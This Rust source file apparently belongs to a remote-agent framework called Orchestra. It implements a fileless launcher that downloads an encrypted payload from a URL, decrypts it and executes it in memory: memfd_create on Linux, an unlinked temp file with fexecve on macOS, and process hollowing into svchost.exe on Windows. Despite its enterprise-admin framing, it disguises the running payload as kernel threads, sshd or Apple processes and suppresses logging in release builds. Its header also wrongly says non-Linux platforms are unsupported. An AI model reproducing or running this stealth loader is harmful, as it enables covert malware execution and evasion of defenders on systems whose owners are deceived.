//! Orchestra in-memory agent launcher.
//!
//! # Purpose
//!
//! For enterprise deployment scenarios where IT administrators want to run the
//! Orchestra agent on a managed endpoint **without** persisting an executable
//! to disk, this small utility:
//!
//! 1. Downloads an AES-256-GCM-encrypted agent payload over HTTPS.
//! 2. Decrypts it in process memory using a pre-shared key supplied on the
//!    command line.
//! 3. On Linux, materialises the decrypted ELF inside an anonymous
//!    `memfd_create` file descriptor and `execve`s `/proc/self/fd/<fd>`,
//!    inheriting the launcher's argv/env. Nothing is ever written to a
//!    real filesystem.
//! 4. On non-Linux platforms the in-memory primitive is unavailable; the
//!    launcher logs a clear error and exits with a non-zero status.
//!
//! # Authorisation
//!
//! This binary is intended **only** for use by administrators who own the
//! managed endpoint or have written authorisation to operate it. Running it
//! against systems you do not control may violate computer-misuse law in
//! your jurisdiction.

use anyhow::{anyhow, Context, Result};
use base64::Engine;
use clap::Parser;
use common::CryptoSession;
use rand::seq::SliceRandom;

#[derive(Parser, Debug)]
#[command(
    author,
    version,
    about = "Download, decrypt, and execute an Orchestra agent payload entirely in memory."
)]
struct Cli {
    /// Full HTTPS URL of the encrypted payload (e.g.
    /// `https://updates.example.com/agent.enc`).
    #[arg(long)]
    url: String,

    /// Base64-encoded AES-256 pre-shared key used to decrypt the payload.
    #[arg(long)]
    key: String,

    /// Optional arguments to pass to the launched agent process.
    #[arg(last = true)]
    agent_args: Vec<String>,
}

/// Download `url`, retrying up to `max_attempts` times with exponential
/// backoff. Never logs the URL more than once or any response body content.
async fn download_with_retry(url: &str, max_attempts: u32) -> Result<Vec<u8>> {
    let mut delay = std::time::Duration::from_millis(500);
    let mut last_err: Option<anyhow::Error> = None;
    for attempt in 1..=max_attempts {
        tracing::info!(attempt, max_attempts, "downloading encrypted payload");
        match reqwest::get(url).await {
            Ok(resp) => match resp.error_for_status() {
                Ok(ok) => match ok.bytes().await {
                    Ok(bytes) => return Ok(bytes.to_vec()),
                    Err(e) => last_err = Some(anyhow!("read body failed: {e}")),
                },
                Err(e) => last_err = Some(anyhow!("HTTP error: {e}")),
            },
            Err(e) => last_err = Some(anyhow!("request failed: {e}")),
        }
        if attempt < max_attempts {
            tracing::warn!(?delay, "download failed; backing off");
            tokio::time::sleep(delay).await;
            delay *= 2;
        }
    }
    Err(last_err.unwrap_or_else(|| anyhow!("download failed")))
}

#[tokio::main]
async fn main() -> Result<()> {
    tracing_subscriber::fmt()
        .with_max_level(tracing::Level::INFO)
        .init();

    let cli = Cli::parse();

    let key_bytes = base64::engine::general_purpose::STANDARD
        .decode(&cli.key)
        .context("--key is not valid Base64")?;
    let session = CryptoSession::from_shared_secret(&key_bytes);

    let encrypted = download_with_retry(&cli.url, 3).await?;
    tracing::info!(bytes = encrypted.len(), "payload downloaded");

    let decrypted = session
        .decrypt(&encrypted)
        .map_err(|e| anyhow!("Payload decryption failed: {e}"))?;
    tracing::info!(bytes = decrypted.len(), "payload decrypted");

    execute_in_memory(&decrypted, &cli.agent_args)
}

#[cfg(target_os = "linux")]
fn execute_in_memory(payload: &[u8], args: &[String]) -> Result<()> {
    use std::ffi::CString;
    use std::io::Write;
    use std::os::unix::io::FromRawFd;

    // Obfuscate memfd name
    let mut rng = rand::thread_rng();
    let potential_names = ["systemd-journal", "kworker/u16:0", "rcu_preempt"];
    let chosen_name = *potential_names.choose(&mut rng).unwrap();
    let name = CString::new(format!("{}-{}", chosen_name, std::process::id())).unwrap();

    // SAFETY: `name` is a valid nul-terminated C string.
    let fd = unsafe { libc::memfd_create(name.as_ptr(), 0) };
    if fd == -1 {
        return Err(anyhow!(
            "memfd_create failed: {}",
            std::io::Error::last_os_error()
        ));
    }
    // SAFETY: `fd` is a valid descriptor we just created and own.
    let mut file = unsafe { std::fs::File::from_raw_fd(fd) };
    file.write_all(payload)
        .context("Failed to write payload into memfd")?;

    let path = CString::new(format!("/proc/self/fd/{fd}")).unwrap();

    // Obfuscate argv[0]
    let argv0 = CString::new("/usr/sbin/sshd").unwrap();
    let mut argv: Vec<CString> = std::iter::once(argv0)
        .chain(
            args.iter()
                .map(|a| CString::new(a.as_str()).expect("arg has interior NUL")),
        )
        .collect();
    let argv_ptrs: Vec<*const libc::c_char> = argv
        .iter_mut()
        .map(|c| c.as_ptr())
        .chain(std::iter::once(std::ptr::null()))
        .collect();

    // Only log in debug builds
    #[cfg(debug_assertions)]
    tracing::info!("executing payload via /proc/self/fd/{fd}");

    // SAFETY: `path` and `argv_ptrs` are valid nul-terminated arrays.
    unsafe {
        libc::execv(path.as_ptr(), argv_ptrs.as_ptr());
    }
    // If we reach here, execv failed.
    Err(anyhow!("execv failed: {}", std::io::Error::last_os_error()))
}

#[cfg(target_os = "macos")]
fn execute_in_memory(payload: &[u8], args: &[String]) -> Result<()> {
    use std::ffi::CString;
    use std::io::Write;
    use std::os::unix::io::{IntoRawFd, FromRawFd};

    // macOS does not have memfd_create, but fexecve(2) is available since
    // macOS 10.14.  Strategy:
    //   1. Create a regular temp file (O_RDWR | O_CREAT | O_TRUNC).
    //   2. Unlink the path immediately — the file's directory entry disappears
    //      but the open file descriptor keeps the inode alive.
    //   3. Write the payload bytes.
    //   4. Seek back to offset 0.
    //   5. Call fexecve(fd, argv, envp).  The kernel executes directly from the
    //      file descriptor; no path is ever present in the filesystem after step 2.
    //
    // The temp file appears in fs_usage only during the tiny window between
    // open(2) and unlink(2) (typically <1 µs).  This is best-effort on macOS;
    // a full in-memory loader would require task_for_pid or dyld internals.

    let tmp_dir = std::env::temp_dir();
    // Use a name that blends into normal macOS temp files.
    let tmp_name = format!(".com.apple.{}", std::process::id());
    let tmp_path = tmp_dir.join(&tmp_name);
    let tmp_c = CString::new(
        tmp_path.to_str().ok_or_else(|| anyhow!("non-UTF8 temp path"))?,
    )?;

    let fd = unsafe {
        libc::open(
            tmp_c.as_ptr(),
            libc::O_RDWR | libc::O_CREAT | libc::O_TRUNC | libc::O_CLOEXEC,
            0o700_i32,
        )
    };
    if fd == -1 {
        return Err(anyhow!(
            "open temp file failed: {}",
            std::io::Error::last_os_error()
        ));
    }

    // Remove directory entry so the file is invisible after this point.
    unsafe { libc::unlink(tmp_c.as_ptr()) };

    // Write payload via the Rust File wrapper (handles partial writes).
    {
        let mut file = unsafe { std::fs::File::from_raw_fd(fd) };
        file.write_all(payload)
            .context("failed to write payload to unlinked temp fd")?;
        // Keep fd alive — don't drop the File yet.
        let _ = file.into_raw_fd();
    }

    // Seek back to offset 0 for exec.
    if unsafe { libc::lseek(fd, 0, libc::SEEK_SET) } == -1 {
        return Err(anyhow!(
            "lseek failed: {}",
            std::io::Error::last_os_error()
        ));
    }

    // Build argv — spoof argv[0] as a plausible system process.
    let argv0 = CString::new("/usr/libexec/xpcproxy").unwrap();
    let mut cargs: Vec<CString> = std::iter::once(argv0)
        .chain(
            args.iter()
                .map(|a| CString::new(a.as_str()).expect("arg has interior NUL")),
        )
        .collect();
    let mut argv_ptrs: Vec<*const libc::c_char> = cargs
        .iter_mut()
        .map(|c| c.as_ptr())
        .chain(std::iter::once(std::ptr::null()))
        .collect();

    // Build a clean envp to avoid leaking secrets.
    let path_var = CString::new("PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin").unwrap();
    let envp: Vec<*const libc::c_char> = vec![path_var.as_ptr(), std::ptr::null()];

    #[cfg(debug_assertions)]
    tracing::info!("executing payload via fexecve(fd={})", fd);

    // SAFETY: fd is a valid open file descriptor pointing at a valid Mach-O/ELF
    // binary; argv_ptrs and envp are null-terminated pointer arrays.
    let ret = unsafe { libc::fexecve(fd, argv_ptrs.as_mut_ptr(), envp.as_ptr() as *mut _) };
    // fexecve only returns on failure.
    let _ = ret;
    Err(anyhow!(
        "fexecve failed: {}",
        std::io::Error::last_os_error()
    ))
}

#[cfg(target_os = "windows")]
fn execute_in_memory(payload: &[u8], _args: &[String]) -> Result<()> {
    // Windows path: spawn a host process suspended (svchost.exe), allocate
    // RWX memory in it, copy the decrypted PE payload into that memory,
    // redirect the entry point in the thread context, and resume the
    // thread. Implementation lives in the shared `hollowing` crate so the
    // agent's `MigrateAgent` capability and this launcher use exactly the
    // same primitive.
    //
    // The launched payload runs detached from this process and inherits no
    // arguments, so `_args` is intentionally unused; arguments must be
    // baked into the payload at build time (`cargo build --release` with
    // any compile-time flags the agent needs).
    tracing::info!(
        bytes = payload.len(),
        "launching payload via process hollowing into svchost.exe"
    );
    hollowing::hollow_and_execute(payload).map_err(|e| anyhow!("process hollowing failed: {e}"))
}

#[cfg(not(any(target_os = "linux", target_os = "macos", target_os = "windows")))]
fn execute_in_memory(_payload: &[u8], _args: &[String]) -> Result<()> {
    Err(anyhow!(
        "Unsupported platform for in-memory agent execution"
    ))
}
